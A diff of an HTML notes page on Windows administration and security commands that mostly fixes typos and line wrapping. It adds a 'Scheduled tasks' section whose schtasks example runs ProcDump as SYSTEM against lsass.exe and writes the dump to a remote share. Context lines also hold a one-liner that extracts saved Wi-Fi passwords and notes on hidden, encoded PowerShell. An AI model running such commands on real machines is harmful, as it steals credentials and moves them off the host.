@@ -255,7 +255,7 @@ ipmo BitsTransfer;Start-BitsTransfer -Source &quot;http://webserver/file.txt&quo
 <span class="c1"># -nop for -NoProfile : do not load the PowerShell profile</span>
 <span class="c1"># -sta for -Sta : start using a single-threaded apartment</span>
 <span class="c1"># -noni for -NonInteractive : does not present an interactive prompt</span>
-<span class="c1"># -w 1 or -w hidden or -win Hidden for -WindowStyle Hidden : hiden PowerShell window</span>
+<span class="c1"># -w 1 or -w hidden or -win Hidden for -WindowStyle Hidden : hidden PowerShell window</span>
 <span class="c1"># -enc for -EncodedCommand : execute the command encoded in base64</span>
 <span class="c1"># -ep bypass or -exec bypass for -ExecutionPolicy bypass : set the default execution</span>
 <span class="c1">#       policy for the current session and saves it in $env:PSExecutionPolicyPreference</span>
@@ -289,19 +289,19 @@ start /b powershell -nop -sta -w <span class="m">1</span> -enc <span class="s2">
 </div>
 <p>Source: <a class="reference external" href="https://securelist.com/shedding-skin-turlas-fresh-faces/88069/">https://securelist.com/shedding-skin-turlas-fresh-faces/88069/</a></p>
 <p>In PowerShell, without writing any file:</p>
-<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>$results = (netsh wlan show profiles) |
-    Select-String &#39;\:(.+)$&#39; | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} |
-    %{(netsh wlan show profile name=$name key=clear)} |
-    Select-String &#39;Key Content\W+\:(.+)$&#39; | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} |
-    %{[PSCustomObject]@{ PROFILE_NAME=$name;PASSWORD=$pass }}
+<div class="highlight-sh notranslate"><div class="highlight"><pre><span></span><span class="nv">$results</span> <span class="o">=</span> <span class="o">(</span>netsh wlan show profiles<span class="o">)</span> <span class="p">|</span>
+    Select-String <span class="s1">&#39;\:(.+)$&#39;</span> <span class="p">|</span> %<span class="o">{</span><span class="nv">$name</span><span class="o">=</span><span class="nv">$_</span>.Matches.Groups<span class="o">[</span><span class="m">1</span><span class="o">]</span>.Value.Trim<span class="o">()</span><span class="p">;</span> <span class="nv">$_</span><span class="o">}</span> <span class="p">|</span>
+    %<span class="o">{(</span>netsh wlan show profile <span class="nv">name</span><span class="o">=</span><span class="nv">$name</span> <span class="nv">key</span><span class="o">=</span>clear<span class="o">)}</span> <span class="p">|</span>
+    Select-String <span class="s1">&#39;Key Content\W+\:(.+)$&#39;</span> <span class="p">|</span> %<span class="o">{</span><span class="nv">$pass</span><span class="o">=</span><span class="nv">$_</span>.Matches.Groups<span class="o">[</span><span class="m">1</span><span class="o">]</span>.Value.Trim<span class="o">()</span><span class="p">;</span> <span class="nv">$_</span><span class="o">}</span> <span class="p">|</span>
+    %<span class="o">{[</span>PSCustomObject<span class="o">]</span>@<span class="o">{</span> <span class="nv">PROFILE_NAME</span><span class="o">=</span><span class="nv">$name</span><span class="p">;</span><span class="nv">PASSWORD</span><span class="o">=</span><span class="nv">$pass</span> <span class="o">}}</span>
 
-# Display the results or record them in files
-$results
-$results | Format-Table -Wrap
-$results | Format-Table -AutoSize
-$results | Out-GridView
-$results | Export-Csv -Path .\wifi.csv -NoTypeInformation -Encoding ASCII
-$results | Out-File -FilePath .\wifi.txt -Encoding ASCII
+<span class="c1"># Display the results or record them in files</span>
+<span class="nv">$results</span>
+<span class="nv">$results</span> <span class="p">|</span> Format-Table -Wrap
+<span class="nv">$results</span> <span class="p">|</span> Format-Table -AutoSize
+<span class="nv">$results</span> <span class="p">|</span> Out-GridView
+<span class="nv">$results</span> <span class="p">|</span> Export-Csv -Path .<span class="se">\w</span>ifi.csv -NoTypeInformation -Encoding ASCII
+<span class="nv">$results</span> <span class="p">|</span> Out-File -FilePath .<span class="se">\w</span>ifi.txt -Encoding ASCII
 </pre></div>
 </div>
 <p>Sources:</p>
@@ -429,6 +429,23 @@ In GPMC, they are linked to a GPO using either:</p>
 <li><p>Computer Configuration -&gt; Preferences -&gt; Control Panel Settings -&gt; Scheduled Tasks</p></li>
 </ul>
 </div>
+<div class="section" id="scheduled-tasks">
+<h2>Scheduled tasks<a class="headerlink" href="#scheduled-tasks" title="Permalink to this headline">¶</a></h2>
+<p>In order to create a scheduled task that runs <a class="reference external" href="https://docs.microsoft.com/en-us/sysinternals/downloads/procdump">ProcDump</a> on <code class="docutils literal notranslate"><span class="pre">lsass.exe</span></code> (Local Security Authority Subsystem service process) and uploads the result on a network share at 13:37, <a class="reference external" href="https://docs.microsoft.com/en-us/windows/win32/taskschd/schtasks">schtasks</a> can be used:</p>
+<div class="highlight-sh notranslate"><div class="highlight"><pre><span></span><span class="c1"># /ru user context under which the task runs</span>
+<span class="c1"># /sc schedule frequency</span>
+<span class="c1"># /st start time in HH:mm format (24-hour time)</span>
+<span class="c1">#      Python: (datetime.datetime.now() + datetime.timedelta(minutes=2)).strftime(&quot;%H:%M&quot;)</span>
+<span class="c1"># /tn task name</span>
+<span class="c1"># /tr task to be run</span>
+schtasks /create /tn <span class="s2">&quot;NameOfMyTask&quot;</span> /ru SYSTEM /sc once /st <span class="m">13</span>:37
+    /tr <span class="s2">&quot;\\192.0.2.42\ro\procdump64.exe -accepteula -ma lsass.exe \\192.0.2.42\rw\lsass.dmp&quot;</span>
+
+<span class="c1"># List tasks with their status and next run time</span>
+schtasks
+</pre></div>
+</div>
+</div>
 <div class="section" id="software-information">
 <h2>Software information<a class="headerlink" href="#software-information" title="Permalink to this headline">¶</a></h2>
 <p>In order to list the upgrades that have been applied, using DISM (Deployment Image Servicing and Management Tool):</p>
@@ -495,7 +512,8 @@ netsh advfirewall dump
 </div>
 <div class="section" id="tcp-port-forwarding-with-netsh">
 <h2>TCP port forwarding with netsh<a class="headerlink" href="#tcp-port-forwarding-with-netsh" title="Permalink to this headline">¶</a></h2>
-<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">netsh</span> <span class="n">interface</span> <span class="n">portproxy</span> <span class="n">add</span> <span class="n">v4tov4</span> <span class="n">listenport</span><span class="o">=</span><span class="mi">1234</span> <span class="n">listenaddress</span><span class="o">=</span><span class="mf">192.0</span><span class="o">.</span><span class="mf">2.42</span> <span class="n">connectport</span><span class="o">=</span><span class="mi">80</span> <span class="n">connectaddress</span><span class="o">=</span><span class="mf">10.13</span><span class="o">.</span><span class="mf">37.1</span>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">netsh</span> <span class="n">interface</span> <span class="n">portproxy</span> <span class="n">add</span> <span class="n">v4tov4</span> <span class="n">listenport</span><span class="o">=</span><span class="mi">1234</span> <span class="n">listenaddress</span><span class="o">=</span><span class="mf">192.0</span><span class="o">.</span><span class="mf">2.42</span>
+    <span class="n">connectport</span><span class="o">=</span><span class="mi">80</span> <span class="n">connectaddress</span><span class="o">=</span><span class="mf">10.13</span><span class="o">.</span><span class="mf">37.1</span>
 </pre></div>
 </div>
 </div>
@@ -560,7 +578,8 @@ subst Z: /d
 <div class="section" id="alternate-data-streams">
 <h2>Alternate Data Streams<a class="headerlink" href="#alternate-data-streams" title="Permalink to this headline">¶</a></h2>
 <p>Get files with <code class="docutils literal notranslate"><span class="pre">Zone.Identifier</span></code> alternate data stream (ADS):</p>
-<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">Get</span><span class="o">-</span><span class="n">ChildItem</span> <span class="o">-</span><span class="n">Recurse</span> <span class="o">|</span> <span class="n">Get</span><span class="o">-</span><span class="n">Item</span> <span class="o">-</span><span class="n">Stream</span> <span class="n">Zone</span><span class="o">.</span><span class="n">Identifier</span> <span class="o">-</span><span class="n">ErrorAction</span> <span class="n">SilentlyContinue</span> <span class="o">|</span> <span class="n">Select</span><span class="o">-</span><span class="n">Object</span> <span class="n">FileName</span>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">Get</span><span class="o">-</span><span class="n">ChildItem</span> <span class="o">-</span><span class="n">Recurse</span> <span class="o">|</span> <span class="n">Get</span><span class="o">-</span><span class="n">Item</span> <span class="o">-</span><span class="n">Stream</span> <span class="n">Zone</span><span class="o">.</span><span class="n">Identifier</span> <span class="o">-</span><span class="n">ErrorAction</span> <span class="n">SilentlyContinue</span> <span class="o">|</span>
+    <span class="n">Select</span><span class="o">-</span><span class="n">Object</span> <span class="n">FileName</span>
 </pre></div>
 </div>
 <p>Read an ADS:</p>
@@ -680,6 +699,7 @@ Set-Location MYDB:<span class="se">\T</span>ables<span class="se">\U</span>sers
 <li><a class="reference internal" href="#user-and-group-management">User and group management</a></li>
 <li><a class="reference internal" href="#enumerate-live-objects">Enumerate live objects</a></li>
 <li><a class="reference internal" href="#group-policy">Group Policy</a></li>
+<li><a class="reference internal" href="#scheduled-tasks">Scheduled tasks</a></li>
 <li><a class="reference internal" href="#software-information">Software information</a></li>
 <li><a class="reference internal" href="#boot-configuration">Boot configuration</a></li>
 <li><a class="reference internal" href="#installed-software">Installed software</a></li>
